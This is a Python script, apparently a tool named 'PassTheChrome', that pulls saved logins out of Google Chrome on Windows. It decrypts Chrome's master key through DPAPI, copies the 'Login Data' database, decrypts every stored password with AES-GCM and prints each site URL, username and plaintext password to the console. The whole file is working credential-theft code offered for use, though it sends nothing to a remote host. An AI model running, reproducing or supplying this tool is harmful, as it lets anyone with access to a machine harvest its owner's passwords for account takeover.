import os
import json
import base64
import sqlite3
import shutil
import time
import itertools
import threading
import sys
from colorama import Fore
from Crypto.Cipher import AES  # pycryptodome
import win32.win32crypt as win32crypt  # pypiwin32
from datetime import datetime, timedelta


banner = """ 
(                                                                         
 )\ )                *   )    )         (       )                          
(()/(    )         ` )  /( ( /(    (    )\   ( /(  (            )      (   
 /(_))( /(  (   (   ( )(_)))\())  ))\ (((_)  )\()) )(    (     (      ))\  
(_))  )(_)) )\  )\ (_(_())((_)\  /((_))\___ ((_)\ (()\   )\    )\  ' /((_)
| _ \((_)_ ((_)((_)|_   _|| |(_)(_)) ((/ __|| |(_) ((_) ((_) _((_)) (_))   
|  _// _` |(_-<(_-<  | |  | ' \ / -_) | (__ | ' \ | '_|/ _ \| '  \()/ -_)  
|_|  \__,_|/__//__/  |_|  |_||_|\___|  \___||_||_||_|  \___/|_|_|_| \___|  
                                                                           """


def get_chrome_datetime(chromedate):
    """Return a datetime.datetime object from a chrome format datetime"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_ecryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key with Base64
    encryption_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    encryption_key = encryption_key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    return win32crypt.CryptUnprotectData(encryption_key,
                                         None, None, None, 0)[1]


def decrypt_password(password, encryption_key):
    try:
        # get the init vector
        iv = password[3:15]
        password = password[15:-16]
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password).decode()
    except:
        try:
            return str(
                win32crypt.CryptUnprotectData(password,
                                              None, None, None, 0)[1])
        except:
            # not supported
            return ''


def main():

    print('\033[95m' + banner + Fore.RESET)
    time.sleep(2)

    done = False

    def animate():
        for c in itertools.cycle(["⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿"]):
            if done:
                break
            sys.stdout.write(
                Fore.YELLOW + '\r        Retrieving some nice info... ' + Fore.RESET + c + Fore.RESET)
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\rDone!     ')

    t = threading.Thread(target=animate)
    t.start()
    time.sleep(4)
    done = True

    # get the AES key
    key = get_ecryption_key()
    # local sqlite chrome db path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default",
                           "Login Data")
    # copy the file to another location
    # as the db will be locked in chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the db
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # (logins) table has the data we need
    cursor.execute("""
                   SELECT origin_url, action_url, username_value,
                   password_value, date_created, date_last_used FROM
                   logins ORDER BY date_created """)
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


if __name__ == "__main__":
    main()
